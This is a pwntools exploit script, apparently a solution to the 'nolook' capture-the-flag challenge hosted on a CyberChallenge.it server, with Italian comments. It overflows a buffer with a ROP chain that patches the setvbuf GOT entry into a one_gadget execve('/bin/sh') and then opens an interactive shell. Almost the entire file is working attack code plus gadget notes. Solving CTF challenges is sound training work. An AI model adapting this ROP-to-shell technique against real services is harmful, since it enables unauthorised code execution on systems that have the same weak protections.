#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('nolook')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("nolook.challs.cyberchallenge.it", 6015, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak *0x40060c
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

'''
#Remoto, ordinati per vicinanza a __libc_start_main
#Uguale a locale usando patchelf e cambiando l'rpath
#__strtold_nan@@GLIBC_PRIVATE
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

#Testata e condizione soddisfatta
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

#L'unico gadget con indirizzo maggiore di una funzione sovrascrivibile nella got e' il terzo
addr_size = 8
vector = b"1"*16 + b"2"*8
pop_rdi_ret = 0x00000000004005a7 #pop rdi; ret;
pop_rsi_r15_ret = 0x0000000000400681 #pop rsi; pop r15; ret;
add_weird_ptr_rsi_edi_ret = 0x00000000004005b0 #add dword ptr [rsi + 0x90], edi; ret;

diff_one_gadget_setvbuf = 0x8909C

payload = dict()

payload[addr_size*0] = pop_rsi_r15_ret
payload[addr_size*1] = p64(exe.sym.got.setvbuf - 0x90)
payload[addr_size*2] = p64(0x0)
payload[addr_size*3] = pop_rdi_ret
payload[addr_size*4] = p64(diff_one_gadget_setvbuf)
payload[addr_size*5] = add_weird_ptr_rsi_edi_ret
payload[addr_size*6] = exe.sym.setvbuf

payload = fit(payload)


io = start()

io.send(vector + payload)

io.interactive()
